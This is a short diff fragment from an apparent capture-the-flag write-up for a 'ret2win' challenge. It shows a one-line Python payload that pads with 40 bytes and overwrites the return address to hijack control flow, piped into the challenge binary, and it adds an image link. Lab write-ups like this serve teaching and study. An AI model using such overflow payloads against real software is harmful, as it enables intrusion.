@@ -63,3 +63,5 @@ we can just use echo to exploit this challenge as the payload is quite small.
 $ python3 -c 'from pwn import *; print("A"*40 + "\x3e\x05\x40\x00\x00\x00\x00\x00" + "\x56\x07\x40\x00\x00\x00\x00\x00")
 ' | ./ret2win
 ```
+
+![](photos/final-pwnn.png)
